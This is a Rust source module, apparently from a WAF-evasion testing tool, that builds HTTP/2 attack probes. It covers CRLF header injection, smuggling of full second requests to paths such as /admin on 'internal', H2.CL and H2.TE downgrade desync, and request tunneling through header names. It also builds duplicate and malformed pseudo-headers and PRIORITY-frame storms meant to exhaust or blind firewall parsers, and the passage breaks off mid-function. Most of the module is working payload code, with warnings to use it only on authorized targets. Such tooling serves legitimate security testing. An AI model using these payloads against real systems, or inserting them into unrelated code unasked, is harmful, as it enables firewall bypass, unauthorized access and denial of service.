//! HTTP/2 frame-level evasion and downgrade techniques.

use crate::safety::{SafetyError, sanitize_input};

/// Errors specific to H2 evasion builders.
#[derive(Debug, thiserror::Error, Clone, PartialEq, Eq)]
pub enum H2EvasionError {
    /// A host or authority string failed sanitization (contained CRLF,
    /// null bytes, or exceeded the safety length limit).
    #[error("invalid host for H2 evasion: {0}")]
    InvalidHost(String),
}

/// An HTTP/2 evasion technique descriptor.
#[derive(Debug, Clone)]
pub struct H2Evasion {
    pub name: &'static str,
    pub description: &'static str,
    pub pseudo_headers: Vec<(String, String)>,
    pub headers: Vec<(String, String)>,
    pub needs_continuation_split: bool,
    pub target_flaw: H2TargetFlaw,
    pub end_stream: Option<bool>,
    pub end_headers: Option<bool>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum H2TargetFlaw {
    ProtocolDowngrade,
    PartialFrameInspection,
    LaxHeaderValidation,
    PseudoHeaderMismatch,
    PaddingConfusion,
    MethodOverride,
    HpackDesync,
    FlagGating,
    FlowControl,
    ConnectionState,
    StreamIdValidation,
}

/// Continuation frame split descriptor.
#[derive(Debug, Clone)]
pub struct ContinuationSplit {
    pub headers_frame: Vec<(String, String)>,
    pub continuation_frames: Vec<Vec<(String, String)>>,
    pub description: String,
}

/// Padding configuration.
#[derive(Debug, Clone)]
pub struct H2Padding {
    pub data_padding: u8,
    pub headers_padding: u8,
    pub inject_priority_frames: bool,
    pub description: String,
    pub malformed: bool,
}

/// HPACK table manipulation.
#[derive(Debug, Clone)]
pub struct HpackTableManipulation {
    pub table_size: u32,
    pub description: String,
}

/// SETTINGS frame bombardment.
#[derive(Debug, Clone)]
pub struct H2SettingsFrame {
    pub setting_id: u16,
    pub value: u32,
    pub description: String,
}

/// Stream ID manipulation.
#[derive(Debug, Clone)]
pub struct H2StreamId {
    pub id: u32,
    pub description: String,
}

/// Flag manipulation descriptor.
#[derive(Debug, Clone)]
pub struct H2Flags {
    pub end_stream: bool,
    pub end_headers: bool,
    pub description: String,
}

fn evasion(name: &'static str, desc: &'static str, flaw: H2TargetFlaw) -> H2Evasion {
    H2Evasion {
        name,
        description: desc,
        pseudo_headers: Vec::new(),
        headers: Vec::new(),
        needs_continuation_split: false,
        target_flaw: flaw,
        end_stream: None,
        end_headers: None,
    }
}

/// Inject CRLF in :path to smuggle headers during downgrade.
///
/// # Safety
/// Sends invalid HTTP/2 pseudo-headers containing raw CRLF sequences.
/// This may corrupt downstream parser state, desynchronize connection pools,
/// or cause request splitting. Only use on targets you own or have explicit
/// authorization to test.
pub fn crlf_in_pseudo_headers(
    path: &str,
    smuggled_header: &str,
    smuggled_value: &str,
) -> Result<H2Evasion, SafetyError> {
    let path = sanitize_input(path)?;
    let h = sanitize_input(smuggled_header)?;
    let v = sanitize_input(smuggled_value)?;
    Ok(H2Evasion {
        name: "H2 CRLF Pseudo-Header Injection",
        description: "Inject CRLF in :path to smuggle headers during downgrade",
        pseudo_headers: vec![
            (":method".into(), "GET".into()),
            (":path".into(), format!("{path}\r\n{h}: {v}")),
            (":scheme".into(), "https".into()),
        ],
        headers: Vec::new(),
        needs_continuation_split: false,
        target_flaw: H2TargetFlaw::ProtocolDowngrade,
        end_stream: None,
        end_headers: None,
    })
}

/// Smuggle a complete second request via CRLF in :path.
///
/// # Safety
/// Sends invalid HTTP/2 pseudo-headers containing raw CRLF sequences.
/// This may corrupt downstream parser state, desynchronize connection pools,
/// or cause request splitting. Only use on targets you own or have explicit
/// authorization to test.
pub fn crlf_request_smuggle(path: &str, smuggled_path: &str) -> Result<H2Evasion, SafetyError> {
    let path = sanitize_input(path)?;
    let smuggled = sanitize_input(smuggled_path)?;
    let req = format!("{path}\r\nHost: internal\r\n\r\nGET {smuggled} HTTP/1.1\r\nHost: internal");
    Ok(H2Evasion {
        name: "H2 CRLF Request Smuggling",
        description: "Smuggle a complete second request via CRLF in :path",
        pseudo_headers: vec![
            (":method".into(), "GET".into()),
            (":path".into(), req),
            (":scheme".into(), "https".into()),
        ],
        ..evasion("", "", H2TargetFlaw::ProtocolDowngrade)
    })
}

/// Build a regular-header CRLF injection probe.
///
/// **Deliberately unsanitised.** This function exists *to* produce
/// CRLF-injected payloads — it's the technique under test, not a bug.
/// Callers must only pass this through HTTP/2 codecs that tolerate
/// the injection (HPACK rejects it; raw frame writers do not). For
/// every other `H2Evasion` helper, header inputs ARE sanitised — see
/// the contract on `authority_host_mismatch`.
///
/// # Safety
/// Sends invalid HTTP/2 headers containing raw CRLF sequences.
/// This may corrupt downstream parser state, desynchronize connection pools,
/// or cause request splitting. Only use on targets you own or have explicit
/// authorization to test.
pub fn crlf_in_regular_header(header: &str, value: &str) -> H2Evasion {
    H2Evasion {
        name: "H2 CRLF Regular Header",
        description: "Inject CRLF into a regular header value",
        headers: vec![(header.into(), format!("{value}\r\nX-Injected: 1"))],
        ..evasion("", "", H2TargetFlaw::ProtocolDowngrade)
    }
}

/// Inject CRLF into a header name.
///
/// # Safety
/// Sends invalid HTTP/2 headers containing raw CRLF sequences.
/// This may corrupt downstream parser state, desynchronize connection pools,
/// or cause request splitting. Only use on targets you own or have explicit
/// authorization to test.
pub fn crlf_in_header_name(name_prefix: &str, name_suffix: &str) -> H2Evasion {
    H2Evasion {
        name: "H2 CRLF Header Name",
        description: "Inject CRLF into a header name",
        headers: vec![(format!("{name_prefix}\r\n{name_suffix}"), "value".into())],
        ..evasion("", "", H2TargetFlaw::ProtocolDowngrade)
    }
}

pub fn mixed_case_headers() -> Vec<H2Evasion> {
    [
        "Content-Type",
        "Transfer-Encoding",
        "Content-Length",
        "X-Forwarded-For",
    ]
    .iter()
    .map(|h| H2Evasion {
        name: "H2 Mixed-Case Header",
        description: "Uppercase header name to bypass lowercase rules",
        headers: vec![(h.to_string(), "value".into())],
        ..evasion("", "", H2TargetFlaw::LaxHeaderValidation)
    })
    .collect()
}

/// Build an H2 Authority/Host mismatch evasion.
///
/// # Errors
///
/// Returns [`H2EvasionError::InvalidHost`] if either host string contains
/// characters that would produce an invalid or injected header value
/// (CRLF, null bytes, etc.). Previously both inputs silently fell back to
/// an empty string on sanitization failure, generating probes with no host
/// information — causing desync attempts against `""` instead of the
/// intended target.
pub fn authority_host_mismatch(
    safe_host: &str,
    target_host: &str,
) -> Result<H2Evasion, H2EvasionError> {
    // Sanitise both host inputs — every other public function in this
    // module that takes user strings runs sanitize_input first, except
    // crlf_in_regular_header / crlf_in_pseudo_headers which deliberately
    // inject CRLF as the technique under test. Without this, a caller
    // passing `safe_host = "example.com\r\nX-Injected: 1"` would get a
    // CRLF-injected header pair through the `headers` Vec, bypassing
    // the same sanitisation used everywhere else.
    let safe_host = sanitize_input(safe_host)
        .map_err(|_| H2EvasionError::InvalidHost(safe_host.to_string()))?;
    let target_host = sanitize_input(target_host)
        .map_err(|_| H2EvasionError::InvalidHost(target_host.to_string()))?;
    Ok(H2Evasion {
        name: "H2 Authority/Host Mismatch",
        description: "Set :authority to safe host but add Host header pointing to target",
        pseudo_headers: vec![(":authority".into(), safe_host)],
        headers: vec![("host".into(), target_host)],
        ..evasion("", "", H2TargetFlaw::PseudoHeaderMismatch)
    })
}

/// Build an H2 double-Host evasion (`:authority` vs `host` header mismatch).
///
/// # Errors
///
/// Returns [`H2EvasionError::InvalidHost`] if either host string fails
/// sanitization. Previously invalid inputs silently produced empty-host
/// probes.
pub fn double_host(primary: &str, secondary: &str) -> Result<H2Evasion, H2EvasionError> {
    let primary =
        sanitize_input(primary).map_err(|_| H2EvasionError::InvalidHost(primary.to_string()))?;
    let secondary = sanitize_input(secondary)
        .map_err(|_| H2EvasionError::InvalidHost(secondary.to_string()))?;
    Ok(H2Evasion {
        name: "H2 Double Host",
        description: "Send :authority and Host header with different values",
        pseudo_headers: vec![(":authority".into(), primary)],
        headers: vec![("host".into(), secondary)],
        ..evasion("", "", H2TargetFlaw::PseudoHeaderMismatch)
    })
}

pub fn split_header_to_continuation(
    payload_header: &str,
    payload_value: &str,
) -> ContinuationSplit {
    ContinuationSplit {
        headers_frame: vec![
            (":method".into(), "GET".into()),
            (":path".into(), "/".into()),
            (":scheme".into(), "https".into()),
            (":authority".into(), "example.com".into()),
        ],
        continuation_frames: vec![vec![(payload_header.into(), payload_value.into())]],
        description: format!("Split '{payload_header}' into CONTINUATION"),
    }
}

pub fn split_path_across_frames(path: &str) -> ContinuationSplit {
    let mid = path
        .char_indices()
        .nth(path.chars().count() / 2)
        .map_or(path.len(), |(i, _)| i);
    let (first, second) = path.split_at(mid);
    ContinuationSplit {
        headers_frame: vec![
            (":method".into(), "GET".into()),
            (":path".into(), first.into()),
            (":scheme".into(), "https".into()),
        ],
        continuation_frames: vec![vec![(":path".into(), second.into())]],
        description: format!("Split :path '{path}' across frames"),
    }
}

pub fn split_pseudo_after_regular() -> ContinuationSplit {
    ContinuationSplit {
        headers_frame: vec![
            (":method".into(), "GET".into()),
            ("x-regular".into(), "value".into()),
        ],
        continuation_frames: vec![vec![
            (":path".into(), "/".into()),
            (":scheme".into(), "https".into()),
            (":authority".into(), "example.com".into()),
        ]],
        description: "Pseudo-headers in CONTINUATION after regular header".into(),
    }
}

/// CONTINUATION N-split — distribute a payload header's bytes across
/// N CONTINUATION frames so a streaming WAF parser with a sliding-
/// window pattern matcher misses contiguous patterns spanning frame
/// boundaries. CVE-2024-27316 (Apache), CVE-2024-24549 (Tomcat),
/// CVE-2024-28182 (nghttp2), CVE-2023-45288 (Go), CVE-2024-27919
/// (Envoy) all reactively addressed this class.
///
/// Existing `split_header_to_continuation` only does 1-into-1
/// (entire payload header in a single CONTINUATION). This parameterised
/// form lets MCTS sweep N=2..=10 — the right N is target-dependent.
#[must_use]
pub fn split_payload_across_n_continuations(
    payload_header: &str,
    payload_value: &str,
    n: usize,
) -> ContinuationSplit {
    let n = n.max(1).min(payload_value.len().max(1));
    let chunk_len = payload_value.len().div_ceil(n);
    let mut frames: Vec<Vec<(String, String)>> = Vec::new();
    let mut emitted = 0;
    // Snap a tentative byte offset to the nearest valid UTF-8 char
    // boundary at OR BELOW `idx`. Without this guard a payload like
    // "🎉🎉" (8 bytes, 2 chars) with n=3 produces chunk_len=3 and
    // would slice `payload_value[0..3]` — mid-codepoint of the first
    // 🎉 (4 bytes) — panicking the process. `is_char_boundary` is
    // O(1); the inner loop runs at most 3 iterations (max UTF-8
    // continuation-byte distance).
    let floor_boundary = |idx: usize| -> usize {
        let mut i = idx.min(payload_value.len());
        while i > 0 && !payload_value.is_char_boundary(i) {
            i -= 1;
        }
        i
    };
    let mut cursor = 0usize;
    for i in 0..n {
        if cursor >= payload_value.len() {
            break;
        }
        let tentative_end = (cursor + chunk_len).min(payload_value.len());
        // For the last chunk always take the whole tail; otherwise
        // snap DOWN to the previous char boundary so we never slice
        // mid-codepoint. Snapping down (not up) guarantees forward
        // progress: end > cursor unless the next codepoint is wider
        // than chunk_len, in which case we widen the chunk by one
        // codepoint to make progress.
        let end = if i == n - 1 || tentative_end >= payload_value.len() {
            payload_value.len()
        } else {
            let snapped = floor_boundary(tentative_end);
            if snapped <= cursor {
                // chunk_len < bytes-needed-for-next-char. Widen to
                // include exactly one full char so we still emit
                // frame i and don't deadlock the loop.
                let mut e = cursor;
                while e < payload_value.len() && !payload_value.is_char_boundary(e + 1) {
                    e += 1;
                }
                (e + 1).min(payload_value.len())
            } else {
                snapped
            }
        };
        let header_name = if i == 0 {
            payload_header.to_string()
        } else {
            format!("x-cont-{i}")
        };
        // First frame carries the header NAME; subsequent frames
        // continue the same header value via concatenation — HTTP/2
        // headers are atomic in the header block but a buggy parser
        // that re-emits header bytes across frames keeps the value
        // contiguous.
        frames.push(vec![(header_name, payload_value[cursor..end].to_string())]);
        emitted += end - cursor;
        cursor = end;
    }
    let _ = emitted;
    ContinuationSplit {
        headers_frame: vec![
            (":method".into(), "GET".into()),
            (":path".into(), "/".into()),
            (":scheme".into(), "https".into()),
            (":authority".into(), "example.com".into()),
        ],
        continuation_frames: frames,
        description: format!("Split '{payload_header}' across {n} CONTINUATION frames"),
    }
}

/// H2 request tunneling via colon-in-header-name.
///
/// HTTP/2 permits colons inside header names (only the first colon
/// separating pseudo-header name from value is special); HTTP/1.1
/// rejects colons in header names. When an H2 front-end downgrades
/// to H1 to talk to origin AND injects auth headers
/// (`X-SSL-VERIFIED`, `X-Frontend-Key`, `X-Real-IP`), wrapping a
/// second HTTP/1.1 request inside a header NAME with embedded colons
/// produces a tunneled request the WAF never inspected — the outer
/// envelope gets the injected auth headers, the inner tunneled
/// request does not. Distinct from `crlf_request_smuggle` which is
/// CRLF-based.
///
/// Reference: PortSwigger Web Security Academy "Bypassing access
/// controls via HTTP/2 request tunnelling".
#[must_use]
pub fn h2_request_tunnel_colon_header_name(_inner_path: &str, _inner_host: &str) -> H2Evasion {
    // The inner H1 request smuggled as a header NAME with embedded
    // colons. Backends parsing the H2→H1 downgrade reconstruct the
    // sequence as a fresh HTTP/1.1 request line + headers. Static
    // string used for the header name so the H2Evasion's name field
    // (&'static str) can describe the technique; runtime per-target
    // tuning happens at the wire encoder.
    H2Evasion {
        name: "H2 Request Tunneling (colon-in-header-name)",
        description: "Embed HTTP/1.1 request line+headers as an H2 header NAME with colons — outer envelope gets injected auth headers, inner tunneled request does not",
        headers: vec![(
            "GET /admin HTTP/1.1\r\nHost: internal\r\nX-Smuggled: true".into(),
            "v".into(),
        )],
        ..evasion(
            "H2 Request Tunneling (colon-in-header-name)",
            "Tunnel request via colon-header-name",
            H2TargetFlaw::ProtocolDowngrade,
        )
    }
}

pub fn padding_configurations() -> Vec<H2Padding> {
    vec![
        H2Padding {
            data_padding: 255,
            headers_padding: 0,
            inject_priority_frames: false,
            description: "Max DATA padding".into(),
            malformed: false,
        },
        H2Padding {
            data_padding: 0,
            headers_padding: 255,
            inject_priority_frames: false,
            description: "Max HEADERS padding".into(),
            malformed: false,
        },
        H2Padding {
            data_padding: 128,
            headers_padding: 128,
            inject_priority_frames: true,
            description: "Mixed padding + PRIORITY".into(),
            malformed: false,
        },
        H2Padding {
            data_padding: 1,
            headers_padding: 1,
            inject_priority_frames: true,
            description: "Minimal padding + PRIORITY".into(),
            malformed: false,
        },
        H2Padding {
            data_padding: 0,
            headers_padding: 0,
            inject_priority_frames: false,
            description: "Malformed padding length".into(),
            malformed: true,
        },
    ]
}

pub fn method_override(path: &str, host: &str, override_method: &str) -> H2Evasion {
    H2Evasion {
        name: "H2 Method Override",
        description: "Use :method=GET but override header for actual method",
        pseudo_headers: vec![
            (":method".into(), "GET".into()),
            (":path".into(), path.into()),
            (":scheme".into(), "https".into()),
            (":authority".into(), host.into()),
        ],
        headers: vec![
            ("x-http-method-override".into(), override_method.into()),
            ("x-method-override".into(), override_method.into()),
        ],
        ..evasion("", "", H2TargetFlaw::MethodOverride)
    }
}

pub fn method_anomaly(path: &str, host: &str, method: &str) -> H2Evasion {
    H2Evasion {
        name: "H2 Method Anomaly",
        description: "Use anomalous :method value",
        pseudo_headers: vec![
            (":method".into(), method.into()),
            (":path".into(), path.into()),
            (":scheme".into(), "https".into()),
            (":authority".into(), host.into()),
        ],
        ..evasion("", "", H2TargetFlaw::MethodOverride)
    }
}

pub fn scheme_confusion(path: &str, host: &str) -> H2Evasion {
    H2Evasion {
        name: "H2 Scheme Confusion",
        description: "Send :scheme=http over TLS",
        pseudo_headers: vec![
            (":method".into(), "GET".into()),
            (":path".into(), path.into()),
            (":scheme".into(), "http".into()),
            (":authority".into(), host.into()),
        ],
        ..evasion("", "", H2TargetFlaw::LaxHeaderValidation)
    }
}

pub fn exotic_scheme(path: &str, host: &str) -> Vec<H2Evasion> {
    vec!["ftp", "javascript", "file", "gopher"]
        .into_iter()
        .map(|s| H2Evasion {
            name: "H2 Exotic Scheme",
            description: "Non-standard :scheme",
            pseudo_headers: vec![
                (":method".into(), "GET".into()),
                (":path".into(), path.into()),
                (":scheme".into(), s.into()),
                (":authority".into(), host.into()),
            ],
            ..evasion("", "", H2TargetFlaw::LaxHeaderValidation)
        })
        .collect()
}

pub fn duplicate_pseudo_header(path: &str, host: &str) -> H2Evasion {
    H2Evasion {
        name: "H2 Duplicate Pseudo-Header",
        description: "Duplicate :path",
        pseudo_headers: vec![
            (":method".into(), "GET".into()),
            (":path".into(), "/".into()),
            (":path".into(), path.into()),
            (":scheme".into(), "https".into()),
            (":authority".into(), host.into()),
        ],
        ..evasion("", "", H2TargetFlaw::LaxHeaderValidation)
    }
}

pub fn duplicate_method(host: &str) -> H2Evasion {
    H2Evasion {
        name: "H2 Duplicate :method",
        description: "Two :method pseudo-headers",
        pseudo_headers: vec![
            (":method".into(), "GET".into()),
            (":method".into(), "POST".into()),
            (":path".into(), "/".into()),
            (":scheme".into(), "https".into()),
            (":authority".into(), host.into()),
        ],
        ..evasion("", "", H2TargetFlaw::LaxHeaderValidation)
    }
}

pub fn duplicate_scheme(host: &str) -> H2Evasion {
    H2Evasion {
        name: "H2 Duplicate :scheme",
        description: "Two :scheme pseudo-headers",
        pseudo_headers: vec![
            (":method".into(), "GET".into()),
            (":path".into(), "/".into()),
            (":scheme".into(), "https".into()),
            (":scheme".into(), "http".into()),
            (":authority".into(), host.into()),
        ],
        ..evasion("", "", H2TargetFlaw::LaxHeaderValidation)
    }
}

pub fn duplicate_authority(host: &str) -> H2Evasion {
    H2Evasion {
        name: "H2 Duplicate :authority",
        description: "Two :authority pseudo-headers",
        pseudo_headers: vec![
            (":method".into(), "GET".into()),
            (":path".into(), "/".into()),
            (":scheme".into(), "https".into()),
            (":authority".into(), "safe.com".into()),
            (":authority".into(), host.into()),
        ],
        ..evasion("", "", H2TargetFlaw::LaxHeaderValidation)
    }
}

pub fn empty_authority(path: &str) -> H2Evasion {
    H2Evasion {
        name: "H2 Empty :authority",
        description: "Empty :authority pseudo-header",
        pseudo_headers: vec![
            (":method".into(), "GET".into()),
            (":path".into(), path.into()),
            (":scheme".into(), "https".into()),
            (":authority".into(), "".into()),
        ],
        ..evasion("", "", H2TargetFlaw::PseudoHeaderMismatch)
    }
}

pub fn missing_authority(path: &str) -> H2Evasion {
    H2Evasion {
        name: "H2 Missing :authority",
        description: "Omit :authority entirely",
        pseudo_headers: vec![
            (":method".into(), "GET".into()),
            (":path".into(), path.into()),
            (":scheme".into(), "https".into()),
        ],
        ..evasion("", "", H2TargetFlaw::PseudoHeaderMismatch)
    }
}

/// Generate :path variants containing forbidden characters.
///
/// # Safety
/// Sends HTTP/2 pseudo-headers with characters forbidden by RFC 7540
/// (null, space, tab). This may corrupt downstream parser state or
/// cause request rejection. Only use on targets you own or have explicit
/// authorization to test.
pub fn invalid_path_chars() -> Vec<H2Evasion> {
    vec!["\x00", " ", "\t"]
        .into_iter()
        .map(|c| H2Evasion {
            name: "H2 Invalid :path",
            description: ":path contains forbidden character",
            pseudo_headers: vec![
                (":method".into(), "GET".into()),
                (":path".into(), format!("/admin{c}test")),
                (":scheme".into(), "https".into()),
                (":authority".into(), "example.com".into()),
            ],
            ..evasion("", "", H2TargetFlaw::LaxHeaderValidation)
        })
        .collect()
}

/// Inject :status into a request HEADERS frame.
///
/// # Safety
/// Sends HTTP/2 request frames containing a response-only pseudo-header.
/// This may corrupt downstream parser state. Only use on targets you own
/// or have explicit authorization to test.
pub fn status_in_request(path: &str) -> H2Evasion {
    H2Evasion {
        name: "H2 :status in Request",
        description: "Inject :status into request HEADERS",
        pseudo_headers: vec![
            (":method".into(), "GET".into()),
            (":path".into(), path.into()),
            (":scheme".into(), "https".into()),
            (":authority".into(), "example.com".into()),
            (":status".into(), "200".into()),
        ],
        ..evasion("", "", H2TargetFlaw::LaxHeaderValidation)
    }
}

pub fn pseudo_header_reordering(path: &str, host: &str) -> Vec<H2Evasion> {
    vec![
        vec![
            (":path".into(), path.into()),
            (":method".into(), "GET".into()),
            (":scheme".into(), "https".into()),
            (":authority".into(), host.into()),
        ],
        vec![
            (":method".into(), "GET".into()),
            (":scheme".into(), "https".into()),
            (":path".into(), path.into()),
            (":authority".into(), host.into()),
        ],
    ]
    .into_iter()
    .map(|h| H2Evasion {
        name: "H2 Pseudo-Header Reordering",
        description: "Violate required pseudo-header order",
        pseudo_headers: h,
        ..evasion("", "", H2TargetFlaw::LaxHeaderValidation)
    })
    .collect()
}

/// Place a regular header before pseudo-headers.
///
/// # Safety
/// Sends HTTP/2 HEADERS frames that violate RFC 7540 ordering rules.
/// This may corrupt downstream parser state. Only use on targets you own
/// or have explicit authorization to test.
pub fn regular_header_before_pseudo() -> H2Evasion {
    H2Evasion {
        name: "H2 Regular Before Pseudo",
        description: "Regular header appears before pseudo-headers",
        pseudo_headers: vec![
            ("x-regular".into(), "value".into()),
            (":method".into(), "GET".into()),
            (":path".into(), "/".into()),
            (":scheme".into(), "https".into()),
            (":authority".into(), "example.com".into()),
        ],
        ..evasion("", "", H2TargetFlaw::LaxHeaderValidation)
    }
}

pub fn h2_cl(host: &str) -> H2Evasion {
    H2Evasion {
        name: "H2.CL Downgrade",
        description: "Inject content-length into HTTP/2 headers for H2->H1 desync",
        pseudo_headers: vec![
            (":method".into(), "POST".into()),
            (":path".into(), "/".into()),
            (":scheme".into(), "https".into()),
            (":authority".into(), host.into()),
        ],
        headers: vec![("content-length".into(), "6".into())],
        ..evasion("", "", H2TargetFlaw::ProtocolDowngrade)
    }
}

pub fn h2_te(host: &str) -> H2Evasion {
    H2Evasion {
        name: "H2.TE Downgrade",
        description: "Inject transfer-encoding into HTTP/2 headers for H2->H1 desync",
        pseudo_headers: vec![
            (":method".into(), "POST".into()),
            (":path".into(), "/".into()),
            (":scheme".into(), "https".into()),
            (":authority".into(), host.into()),
        ],
        headers: vec![("transfer-encoding".into(), "chunked".into())],
        ..evasion("", "", H2TargetFlaw::ProtocolDowngrade)
    }
}

pub fn alpn_h2c() -> H2Evasion {
    H2Evasion {
        name: "ALPN h2c",
        description: "Exploit ALPN to force h2c downgrade",
        headers: vec![("alpn-protocol".into(), "h2c".into())],
        ..evasion("", "", H2TargetFlaw::ProtocolDowngrade)
    }
}

pub fn settings_bombardment() -> Vec<H2SettingsFrame> {
    vec![
        H2SettingsFrame {
            setting_id: 2,
            value: 0,
            description: "ENABLE_PUSH=0".into(),
        },
        H2SettingsFrame {
            setting_id: 3,
            value: 0,
            description: "MAX_CONCURRENT_STREAMS=0".into(),
        },
        H2SettingsFrame {
            setting_id: 4,
            value: 0,
            description: "INITIAL_WINDOW_SIZE=0".into(),
        },
        H2SettingsFrame {
            setting_id: 5,
            value: 16_777_215,
            description: "MAX_FRAME_SIZE=max".into(),
        },
        H2SettingsFrame {
            setting_id: 5,
            value: u32::MAX,
            description: "MAX_FRAME_SIZE=overflow".into(),
        },
    ]
}

pub fn window_update_desync() -> Vec<H2StreamId> {
    vec![
        H2StreamId {
            id: 0,
            description: "WINDOW_UPDATE stream 0 huge".into(),
        },
        H2StreamId {
            id: 1,
            description: "WINDOW_UPDATE stream 1 zero".into(),
        },
    ]
}

pub fn rst_stream_injection() -> Vec<H2StreamId> {
    vec![
        H2StreamId {
            id: 1,
            description: "RST_STREAM on active stream".into(),
        },
        H2StreamId {
            id: 3,
            description: "RST_STREAM on idle stream".into(),
        },
    ]
}

pub fn goaway_injection() -> Vec<H2StreamId> {
    vec![
        H2StreamId {
            id: u32::MAX,
            description: "GOAWAY last-stream-id max".into(),
        },
        H2StreamId {
            id: 0,
            description: "GOAWAY last-stream-id 0".into(),
        },
    ]
}

pub fn invalid_stream_ids() -> Vec<H2StreamId> {
    vec![
        H2StreamId {
            id: 0,
            description: "Stream ID 0 (reserved)".into(),
        },
        H2StreamId {
            id: 2,
            description: "Even stream ID (server push)".into(),
        },
    ]
}

pub fn flag_manipulations() -> Vec<H2Flags> {
    vec![
        H2Flags {
            end_stream: false,
            end_headers: true,
            description: "No END_STREAM on body request".into(),
        },
        H2Flags {
            end_stream: true,
            end_headers: false,
            description: "END_STREAM without END_HEADERS".into(),
        },
        H2Flags {
            end_stream: false,
            end_headers: false,
            description: "Neither flag set".into(),
        },
    ]
}

pub fn hpack_table_manipulations() -> Vec<HpackTableManipulation> {
    vec![
        HpackTableManipulation {
            table_size: 0,
            description: "Zero table size".into(),
        },
        HpackTableManipulation {
            table_size: 65535,
            description: "Maximum table size".into(),
        },
        HpackTableManipulation {
            table_size: 1,
            description: "Tiny table".into(),
        },
        HpackTableManipulation {
            table_size: 16384,
            description: "Non-standard table size".into(),
        },
        HpackTableManipulation {
            table_size: u32::MAX,
            description: "Extreme table size".into(),
        },
    ]
}

pub fn all_evasions(path: &str, host: &str) -> Result<Vec<H2Evasion>, SafetyError> {
    let mut evasions = vec![
        crlf_in_regular_header("user-agent", "Mozilla/5.0"),
        crlf_in_header_name("x", "foo: bar"),
    ];
    // authority_host_mismatch / double_host now return Result — propagate
    // the error (invalid host) mapped to the closest SafetyError variant
    // so the existing all_evasions signature stays stable.
    evasions.push(
        authority_host_mismatch(host, "localhost").map_err(|_| SafetyError::HeaderInjection)?,
    );
    evasions.push(
        authority_host_mismatch(host, "127.0.0.1").map_err(|_| SafetyError::HeaderInjection)?,
    );
    evasions.push(double_host(host, "internal.service").map_err(|_| SafetyError::HeaderInjection)?);
    evasions.extend([
        method_override(path, host, "POST"),
        method_override(path, host, "PUT"),
        method_anomaly(path, host, "CONNECT"),
        method_anomaly(path, host, "PRI"),
        scheme_confusion(path, host),
        duplicate_pseudo_header(path, host),
        duplicate_method(host),
        duplicate_scheme(host),
        duplicate_authority(host),
        empty_authority(path),
        missing_authority(path),
        status_in_request(path),
        regular_header_before_pseudo(),
        h2_cl(host),
        h2_te(host),
        alpn_h2c(),
    ]);
    evasions.push(crlf_in_pseudo_headers(
        path,
        "X-Forwarded-For",
        "127.0.0.1",
    )?);
    evasions.push(crlf_in_pseudo_headers(
        path,
        "Transfer-Encoding",
        "chunked",
    )?);
    evasions.push(crlf_request_smuggle(path, "/admin")?);
    evasions.push(crlf_request_smuggle(path, "/internal/debug")?);
    evasions.extend(mixed_case_headers());
    evasions.extend(exotic_scheme(path, host));
    evasions.extend(invalid_path_chars());
    evasions.extend(pseudo_header_reordering(path, host));
    Ok(evasions)
}

// ── #95 SPCA: Single-Packet Connection Abuse / H2 stream-priority topology ──

/// An HTTP/2 PRIORITY frame descriptor.
///
/// The HTTP/2 PRIORITY frame (type=0x2) establishes a dependency tree.
/// When WAFs consume the dependency tree to schedule inspection but origins
/// reorder streams differently, the inspection/execution split becomes an
/// evasion surface.
#[derive(Debug, Clone)]
pub struct H2PriorityFrame {
    pub stream_id: u32,
    pub exclusive: bool,
    pub depends_on: u32,
    pub weight: u8,
    pub description: String,
}

/// An SPCA attack descriptor — a collection of PRIORITY frames that
/// craft a specific dependency topology.
#[derive(Debug, Clone)]
pub struct SpcaTopology {
    pub name: &'static str,
    pub description: &'static str,
    pub frames: Vec<H2PriorityFrame>,
    pub target_flaw: H2TargetFlaw,
}

/// Build a circular priority dependency loop across `n_streams` streams.
///
/// In a circular dependency A→B→C→A, RFC 7540 §5.3.1 says the new
/// dependency MUST be ignored or reshuffled. However several WAF inline
/// parsers walk the dependency pointer chain for scheduling decisions —
/// if they loop without a cycle-detection guard they either crash or
/// silently truncate inspection. Streams 1, 3, 5, … are client-initiated;
/// stream 0 is the connection control stream.
///
/// # Panics (benign)
/// Does not panic; produces an empty frame set if n_streams < 2.
#[must_use]
pub fn spca_circular_priority(n_streams: usize) -> SpcaTopology {
    if n_streams < 2 {
        return SpcaTopology {
            name: "SPCA Circular Priority",
            description: "Circular dependency loop (n_streams < 2 is no-op)",
            frames: Vec::new(),
            target_flaw: H2TargetFlaw::FlowControl,
        };
    }
    // Use odd stream IDs (client-initiated). Build: 1→3, 3→5, …, N→1.
    let stream_ids: Vec<u32> = (0..n_streams).map(|i| (2 * i + 1) as u32).collect();
    let mut frames: Vec<H2PriorityFrame> = Vec::with_capacity(n_streams);
    for i in 0..n_streams {
        let stream_id = stream_ids[i];
        let depends_on = stream_ids[(i + 1) % n_streams]; // wraps around
        frames.push(H2PriorityFrame {
            stream_id,
            exclusive: false,
            depends_on,
            weight: 16,
            description: format!(
                "stream {stream_id} depends on {depends_on} (circular link {}/{})",
                i + 1,
                n_streams
            ),
        });
    }
    SpcaTopology {
        name: "SPCA Circular Priority",
        description: "Circular PRIORITY dependency loop — WAF parsers without cycle detection \
                       loop forever or skip inspection; RFC 7540 §5.3.1 requires reshuffling",
        frames,
        target_flaw: H2TargetFlaw::FlowControl,
    }
}

/// Build an orphan-dependency PRIORITY frame.
///
/// Set `stream_id`'s dependency to a non-existent (closed or idle)
/// `parent` stream. WAFs that track a live stream table may skip
/// scheduling the orphaned stream, effectively skipping inspection.
#[must_use]
pub fn spca_orphan_dependency(stream_id: u32, parent: u32) -> SpcaTopology {
    SpcaTopology {
        name: "SPCA Orphan Dependency",
        description: "PRIORITY frame pointing at a closed/idle parent stream — \
                       WAFs that only inspect streams in the live-stream table miss this one",
        frames: vec![H2PriorityFrame {
            stream_id,
            exclusive: false,
            depends_on: parent,
            weight: 1,
            description: format!("stream {stream_id} orphaned to non-existent parent {parent}"),
        }],
        target_flaw: H2TargetFlaw::StreamIdValidation,
    }
}

/// Exclusive-weight storm — send a cascade of exclusive PRIORITY frames
/// that each claim to be the sole exclusive child of the root (stream 0).
///
/// RFC 7540 §5.3.1: an exclusive flag moves all existing children of the
/// parent under the new stream. A flood of exclusive PRIORITY frames
/// forces O(n²) tree rewrites on the WAF's priority scheduler. This is
/// the HTTP/2 PRIORITY Flood technique (CVE-2023-44487 adjacent).
/// Payload streams are interleaved so the expensive tree rewrites happen
/// in the same pass as the attack payload evaluation.
#[must_use]
pub fn spca_exclusive_weight_storm() -> SpcaTopology {
    let mut frames: Vec<H2PriorityFrame> = Vec::new();
